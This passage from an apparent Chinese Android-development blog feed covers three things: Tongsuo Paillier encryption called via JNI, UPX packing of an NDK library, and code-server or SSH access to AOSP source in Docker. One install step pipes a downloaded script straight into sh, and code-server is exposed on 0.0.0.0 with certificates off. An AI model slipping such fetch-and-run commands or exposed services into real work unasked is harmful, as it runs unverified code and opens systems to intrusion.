targetSdk <span class="number">32</span></span><br><span class="line">        versionCode <span class="number">1</span></span><br><span class="line">        versionName <span class="string">&quot;1.0&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>编写测试代码，这里直接根据官方提供的例子改一改，就好了</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/paillier.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/pem.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLOCKS_PER_MSEC (CLOCKS_PER_SEC/1000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test_paillier</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int32_t</span> r;</span><br><span class="line">    <span class="type">clock_t</span> begin, end;</span><br><span class="line">    PAILLIER_KEY *pail_key = <span class="literal">nullptr</span>, *pail_pub = <span class="literal">nullptr</span>;</span><br><span class="line">    PAILLIER_CTX *ctx1 = <span class="literal">nullptr</span>, *ctx2 = <span class="literal">nullptr</span>;</span><br><span class="line">    PAILLIER_CIPHERTEXT *c1 = <span class="literal">nullptr</span>, *c2 = <span class="literal">nullptr</span>, *c3 = <span class="literal">nullptr</span>;</span><br><span class="line">    FILE *pk_file = <span class="built_in">fopen</span>(<span class="string">&quot;/data/data/com.littleq.tongsuodemo/files/pail-pub.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    FILE *sk_file = <span class="built_in">fopen</span>(<span class="string">&quot;/data/data/com.littleq.tongsuodemo/files/pail-key.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pail_pub = <span class="built_in">PEM_read_PAILLIER_PublicKey</span>(pk_file, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>)) == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    <span class="keyword">if</span> ((pail_key = <span class="built_in">PEM_read_PAILLIER_PrivateKey</span>(sk_file, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>)) == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ctx1 = <span class="built_in">PAILLIER_CTX_new</span>(pail_pub, PAILLIER_MAX_THRESHOLD)) == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    <span class="keyword">if</span> ((ctx2 = <span class="built_in">PAILLIER_CTX_new</span>(pail_key, PAILLIER_MAX_THRESHOLD)) == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((c1 = <span class="built_in">PAILLIER_CIPHERTEXT_new</span>(ctx1)) == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    <span class="keyword">if</span> ((c2 = <span class="built_in">PAILLIER_CIPHERTEXT_new</span>(ctx1)) == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">    begin = <span class="built_in">clock</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">PAILLIER_encrypt</span>(ctx1, c1, <span class="number">20000021</span>))</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    end = <span class="built_in">clock</span>();</span><br><span class="line">    __android_log_print(<span class="number">6</span>, <span class="string">&quot;LQ-&gt;&quot;</span> ,<span class="string">&quot;PAILLIER_encrypt(20000021) cost: %lfms\n&quot;</span>, (<span class="type">double</span>)(end - begin)/CLOCKS_PER_MSEC);</span><br><span class="line"></span><br><span class="line">    begin = <span class="built_in">clock</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">PAILLIER_encrypt</span>(ctx1, c2, <span class="number">500</span>))</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    end = <span class="built_in">clock</span>();</span><br><span class="line">    __android_log_print(<span class="number">6</span>, <span class="string">&quot;LQ-&gt;&quot;</span> ,<span class="string">&quot;PAILLIER_encrypt(500) cost: %lfms\n&quot;</span>, (<span class="type">double</span>)(end - begin)/CLOCKS_PER_MSEC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((c3 = <span class="built_in">PAILLIER_CIPHERTEXT_new</span>(ctx1)) == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">    begin = <span class="built_in">clock</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">PAILLIER_add</span>(ctx1, c3, c1, c2))</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    end = <span class="built_in">clock</span>();</span><br><span class="line">    __android_log_print(<span class="number">6</span>, <span class="string">&quot;LQ-&gt;&quot;</span> ,<span class="string">&quot;PAILLIER_add(C2000021,C500) cost: %lfms\n&quot;</span>, (<span class="type">double</span>)(end - begin)/CLOCKS_PER_MSEC);</span><br><span class="line"></span><br><span class="line">    begin = <span class="built_in">clock</span>();</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="built_in">PAILLIER_decrypt</span>(ctx2, &amp;r, c3)))</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    end = <span class="built_in">clock</span>();</span><br><span class="line">    __android_log_print(<span class="number">6</span>, <span class="string">&quot;LQ-&gt;&quot;</span> ,<span class="string">&quot;PAILLIER_decrypt(C20000021,C500) result: %d, cost: %lfms\n&quot;</span>, r, (<span class="type">double</span>)(end - begin)/CLOCKS_PER_MSEC);</span><br><span class="line"></span><br><span class="line">    begin = <span class="built_in">clock</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">PAILLIER_mul</span>(ctx1, c3, c2, <span class="number">800</span>))</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    end = <span class="built_in">clock</span>();</span><br><span class="line">    __android_log_print(<span class="number">6</span>, <span class="string">&quot;LQ-&gt;&quot;</span> ,<span class="string">&quot;PAILLIER_mul(C500,800) cost: %lfms\n&quot;</span>, (<span class="type">double</span>)(end - begin)/CLOCKS_PER_MSEC);</span><br><span class="line"></span><br><span class="line">    begin = <span class="built_in">clock</span>();</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="built_in">PAILLIER_decrypt</span>(ctx2, &amp;r, c3)))</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    end = <span class="built_in">clock</span>();</span><br><span class="line">    __android_log_print(<span class="number">6</span>, <span class="string">&quot;LQ-&gt;&quot;</span> ,<span class="string">&quot;PAILLIER_decrypt(C500,800) result: %d, cost: %lfms\n&quot;</span>, r, (<span class="type">double</span>)(end - begin)/CLOCKS_PER_MSEC);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    __android_log_print(<span class="number">6</span>, <span class="string">&quot;LQ-&gt;&quot;</span> ,<span class="string">&quot;PAILLIER_CIPHERTEXT_encode size: %zu\n&quot;</span>, <span class="built_in">PAILLIER_CIPHERTEXT_encode</span>(ctx2, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">    err:</span><br><span class="line">    <span class="built_in">PAILLIER_KEY_free</span>(pail_key);</span><br><span class="line">    <span class="built_in">PAILLIER_KEY_free</span>(pail_pub);</span><br><span class="line">    <span class="built_in">PAILLIER_CIPHERTEXT_free</span>(c1);</span><br><span class="line">    <span class="built_in">PAILLIER_CIPHERTEXT_free</span>(c2);</span><br><span class="line">    <span class="built_in">PAILLIER_CIPHERTEXT_free</span>(c3);</span><br><span class="line">    <span class="built_in">PAILLIER_CTX_free</span>(ctx1);</span><br><span class="line">    <span class="built_in">PAILLIER_CTX_free</span>(ctx2);</span><br><span class="line">    <span class="built_in">fclose</span>(sk_file);</span><br><span class="line">    <span class="built_in">fclose</span>(pk_file);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">JNIEXPORT jstring JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_littleq_tongsuodemo_MainActivity_stringFromJNI</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        JNIEnv *env,</span></span></span><br><span class="line"><span class="params"><span class="function">        jobject <span class="comment">/* this */</span>)</span> </span>&#123;</span><br><span class="line">    std::string hello = <span class="string">&quot;Hello from C++&quot;</span>;</span><br><span class="line">    <span class="built_in">test_paillier</span>();</span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(hello.<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里我偷懒了，因为我的手机root了，所以直接移动文件到项目的私有目录，然后直接读就可以了，如果没root，需要自己移动到对应目录下面，然后在读。</p><ul><li>运行查看结果</li></ul><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog3/image_tq8KrRIPon.png"></p><p>发现，完美输出，调用成功，噢耶~~</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前，能支持同态加密的库还是相对来说比较少的，然后看到了开源的铜锁(Tongsuo)这个基于openssl衍生出来的库，看起来还是不错的，然后对于多平台的移植性，从本文测试的Android来说，还是非常顺畅的，速度也还挺快，希望这个库可以一直更新下去，也感谢这个库作者们的开源，至于什么是同态加密，这个库的作者也在其文档当中有详细的介绍，感兴趣的读者可以自行阅读相关文档，好了，到这里本文就结束了，感谢大家阅读到这里，最后说一句，目前在app当中，我还没见到使用同态加密算法的影子，大概率可能是因为我见过的app比较少，不过有了这个库，大可以直接来使用，相信上了这类算法的app在分析算法的过程当中，应该会非常的酸爽，溜了，溜了~~</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://github.com/Tongsuo-Project/Tongsuo" title="https://github.com/Tongsuo-Project/Tongsuo">https://github.com/Tongsuo-Project/Tongsuo</a></li><li><a href="https://www.yuque.com/tsdoc/ts" title="https://www.yuque.com/tsdoc/ts">https://www.yuque.com/tsdoc/ts</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Android集成铜锁-Tongsuo-库&quot;&gt;&lt;a href=&quot;#Android集成铜锁-Tongsuo-库&quot; class=&quot;headerlink&quot; title=&quot;Android集成铜锁(Tongsuo)库&quot;&gt;&lt;/a&gt;Android集成铜锁(Tongsuo)库&lt;/h1&gt;&lt;p&gt;作者：littleQ&lt;/p&gt;</summary>
    
    
    
    <category term="Android开发" scheme="http://security-kitchen.com/categories/Android%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Android开发" scheme="http://security-kitchen.com/tags/Android%E5%BC%80%E5%8F%91/"/>
    
    <category term="铜锁" scheme="http://security-kitchen.com/tags/%E9%93%9C%E9%94%81/"/>
    
  </entry>
  
  <entry>
    <title>Android开发（4）—— NDK实现UPX加壳（littleQ）</title>
    <link href="http://security-kitchen.com/2023/12/24/littleQ4/"/>
    <id>http://security-kitchen.com/2023/12/24/littleQ4/</id>
    <published>2023-12-23T16:00:00.000Z</published>
    <updated>2023-12-24T14:39:56.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NDK实现UPX加壳"><a href="#NDK实现UPX加壳" class="headerlink" title="NDK实现UPX加壳"></a>NDK实现UPX加壳</h1><p>作者：littleQ</p><span id="more"></span><blockquote><p>UPX (the Ultimate Packer for eXecutables)是一款先进的可执行程序文件压缩器，压缩过的可执行文件体积缩小50%-70% ，这样减少了磁盘占用空间、网络上传下载的时间和其它分布以及存储费用。</p></blockquote><p>这次我们给NDK编译出来的so加上upx壳，至于什么是UPX壳，不了解的读者可以自行查阅下相关的资料了。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>我这里是在Mac上测试的，其他环境暂未测试，经过测试M1的MAC是好用的。</p><ul><li>系统版本: 13.1</li></ul><h3 id="安装upx壳"><a href="#安装upx壳" class="headerlink" title="安装upx壳"></a>安装upx壳</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install --build-from-source upx</span><br></pre></td></tr></table></figure><p>因为我这个系统比较新，所以采用这个方式安装，否则出现报错。</p><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><p>首先需要建立一个Android的NDK项目，这里就不赘述了。</p><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>这里需要自己预判下，所生成的so的大小，如果体积过于小的话，在进行UPX处理的时候会失败，所以需要想办法增大一下代码的体积，如果代码量足够大的话，是没有这个问题的，具体增大代码体积方式如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="type">const</span> dummy_to_make_this_compressible[<span class="number">100000</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="导出init函数"><a href="#导出init函数" class="headerlink" title="导出init函数"></a>导出init函数</h3><p>需要在native代码当中导出<code>_init</code>函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extern &quot;C&quot; &#123;void _init(void)&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p>因为这里我们构建的是cpp的项目，因此需要按照c的方式导出，否则会被编译器重命名。</p><h2 id="执行UPX加壳"><a href="#执行UPX加壳" class="headerlink" title="执行UPX加壳"></a>执行UPX加壳</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$upx</span> -o libupxdemo-upx.so libupxdemo.so --android-shlib</span><br><span class="line"></span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2020</span><br><span class="line">UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">libupxdemo.so  3/4  [*****************************************...]   37.7%  \     697640 -&gt;    634028   90.88%   linux/arm64   libupxdemo-upx.so</span><br><span class="line"></span><br><span class="line">Packed 1 file.</span><br></pre></td></tr></table></figure><p>这样就结束了，我们来测试下，直接在Android项目当中引入这个so试一下。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog4/image_NeEx2fZE7q.png"></p><p>发现是可以正常运行的，因此到这里upx加壳也就完成了。</p><h2 id="upx源码编译"><a href="#upx源码编译" class="headerlink" title="upx源码编译"></a>upx源码编译</h2><p>当然，upx也可以选择源码编译的方式安装</p><h3 id="下载UPX库"><a href="#下载UPX库" class="headerlink" title="下载UPX库"></a>下载UPX库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/upx/upx.git</span><br><span class="line"><span class="comment"># 初始化子模块</span></span><br><span class="line">git submodule update --init --recursive</span><br></pre></td></tr></table></figure><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>如果提示没有找到ucl的路径，需要自己在ucl里面配置一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="built_in">export</span> SHELL = /bin/sh</span><br><span class="line"><span class="comment"># 这里的UCL的路径填写实际编译之后的UCL的路径</span></span><br><span class="line"><span class="built_in">export</span> UPX_UCLDIR = </span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure><p>编译源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make all</span><br></pre></td></tr></table></figure><p>这样就可以编译成功了，不过对于mac还是直接brew直接安装来的省事儿。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文主要是介绍了一下UPX壳如何应用在NDK文件当中，想对来说遇到的问题不算多，总体还是比较顺利的。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;NDK实现UPX加壳&quot;&gt;&lt;a href=&quot;#NDK实现UPX加壳&quot; class=&quot;headerlink&quot; title=&quot;NDK实现UPX加壳&quot;&gt;&lt;/a&gt;NDK实现UPX加壳&lt;/h1&gt;&lt;p&gt;作者：littleQ&lt;/p&gt;</summary>
    
    
    
    <category term="Android开发" scheme="http://security-kitchen.com/categories/Android%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Android开发" scheme="http://security-kitchen.com/tags/Android%E5%BC%80%E5%8F%91/"/>
    
    <category term="加壳" scheme="http://security-kitchen.com/tags/%E5%8A%A0%E5%A3%B3/"/>
    
  </entry>
  
  <entry>
    <title>Android开发（4）——一种修改&amp;阅读AOSP的新方式（littleQ）</title>
    <link href="http://security-kitchen.com/2023/12/24/littleQ5/"/>
    <id>http://security-kitchen.com/2023/12/24/littleQ5/</id>
    <published>2023-12-23T16:00:00.000Z</published>
    <updated>2023-12-24T14:43:25.786Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一种修改-amp-阅读AOSP的新方式"><a href="#一种修改-amp-阅读AOSP的新方式" class="headerlink" title="一种修改&amp;阅读AOSP的新方式"></a>一种修改&amp;阅读AOSP的新方式</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前写过了如何使用docker编译AOSP的方案，目前这个方案在Ubuntu上面还算是比较完美的，但是问题又来了，虽然说在docker当中是可以用vim来实现代码的阅读和编辑的，但是要是有个ide，那看起来岂不是更爽，然后要是能有一个网页在线的IDE，那岂不是爽上加爽了，本着这个思路，然后就开始了一顿方案的查找，最终找到了一个还算是不错的方案。</p><p>然后就找到了<code>code-server</code>这个网页版的vscode，如果我在docker启动之后，然后再打开这个服务，是不是我就可以在浏览器当中直接访问和修改AOSP代码了，目前评估一下，这个方案大概率是可行的，所以呢，也就有了本篇文章。</p><p>作者：littleQ</p><span id="more"></span><h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><p>首先，搭建docker的AOSP环境，具体的方案可以参考文末的参考资料，这里我就不再展开说一遍了，</p><p>这里需要注意一个问题，需要提前把端口暴露出来，否则是访问不到的，启动docker命令如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -it -p 8899:8080 -v /home/lq/AOSP/android-8.1.0_r1:/aosp sabdelkader/aosp</span><br></pre></td></tr></table></figure><p>前面这个端口号是映射到本机的端口号，需要不能和其他的端口冲突，后面那个是<code>code-server</code>默认的端口号，如果想改成其他的也可以，需要自行修改配置文件。</p><h3 id="2-安装依赖"><a href="#2-安装依赖" class="headerlink" title="2. 安装依赖"></a>2. 安装依赖</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://code-server.dev/install.sh | sh</span><br></pre></td></tr></table></figure><p>这样，code-server就安装好了</p><h3 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3. 修改配置文件"></a>3. 修改配置文件</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#~/.config/code-server/config.yaml</span></span><br><span class="line"><span class="attr">bind-addr:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:8080</span></span><br><span class="line"><span class="attr">auth:</span> <span class="string">password</span></span><br><span class="line"><span class="attr">password:</span> [<span class="string">这个密码应该是自动生成的，也可以选择手动修改</span>]</span><br><span class="line"><span class="attr">cert:</span> <span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里，bind-addr需要改成<code>0.0.0.0</code>，否则外部是访问不到的。</p><h3 id="4-访问地址"><a href="#4-访问地址" class="headerlink" title="4. 访问地址"></a>4. 访问地址</h3><p>访问物理机IP的8899端口，如果看到如下图所示，表示成功了。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog5/image_NZLl3Ns2Hl.png"></p><p>输入密码之后，就可以访问到所在的源码了，点击open folder</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog5/image_geL8vMlvHh.png"></p><p>选择<code>/aosp</code>的路径，然后进入想查看的AOSP的代码部分，然后就可以愉快的查看代码了。</p><h3 id="5-尝试编译"><a href="#5-尝试编译" class="headerlink" title="5. 尝试编译"></a>5. 尝试编译</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh </span><br><span class="line">lunch</span><br><span class="line">make -j16</span><br></pre></td></tr></table></figure><p>然后就进入愉快的编译过程了。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog5/image_3ad6k9atDa.png"></p><p>后续修改编译这里就不演示了，和普通编译AOSP的过程一致。</p><h2 id="番外篇"><a href="#番外篇" class="headerlink" title="番外篇"></a>番外篇</h2><p>上面已经说道了，我们可以用网页来直接编辑和阅读AOSP的代码，然后想到了另一个方案，直接沿用vscode的客户端，然后通过ssh直接连进去来实现代码的阅读和编辑，这样虽然是损失了一些便携性，我需要装一个客户端，但是呢，有个客户端，应该会比单纯网页的性能要好一点，并且在家里的时候，这个网络传输的速度还是可以的，因此呢，这个番外篇呢，就来说一下如何直接使用vscode客户端来实现AOSP的源码阅读。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>vscode客户端</li><li>remote - ssh插件</li></ul><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>这里需要修改一下Dockerfile，原始的Dockerfile可以参考我之前所写的文章。</p><p>具体的文件如下，这里我直接给出了需要增加的地方。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#install essential build 需要在这里安装openssh-server</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y bsdmainutils openjdk-8-jdk git-core gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev libgl1-mesa-dev libxml2-utils xsltproc unzip python python3 bc libc6 vim openssh-server</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#config ssh 配置ssh的相关配置，我这里直接使用的ssh的key作为验证方案</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /var/run/sshd /root/.ssh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -ri <span class="string">&#x27;s#session    required     pam_loginuid.so#session    required     pam_loginuid.so#g&#x27;</span> /etc/pam.d/sshd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> authorized_keys /root/.ssh/authorized_keys</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> run.sh /run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 755 /run.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴漏22端口出去</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>run.sh</code>文件如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">/usr/sbin/sshd -D &amp;</span><br></pre></td></tr></table></figure><p>启动docker命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -it -p 8899:22 -v /home/lq/AOSP/android-8.1.0_r1:/aosp sabdelkader/aosp</span><br></pre></td></tr></table></figure><p>这里我把本机的8899端口映射为docker容器的22端口了，这个可以自行更改。</p><h3 id="vscode连接服务"><a href="#vscode连接服务" class="headerlink" title="vscode连接服务"></a>vscode连接服务</h3><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog5/image_fqJSbuaWI-.png"></p><p>在这里输入相关配置，然后敲回车就可以了，稍等片刻就可以愉快的阅读了。</p><p><img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog5/image_2qM3ZdWpm0.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://github.com/coder/code-server" title="https://github.com/coder/code-server">https://github.com/coder/code-server</a></li><li><a href="https://github.com/microsoft/vscode-cpptools/releases/tag/1.13.9" 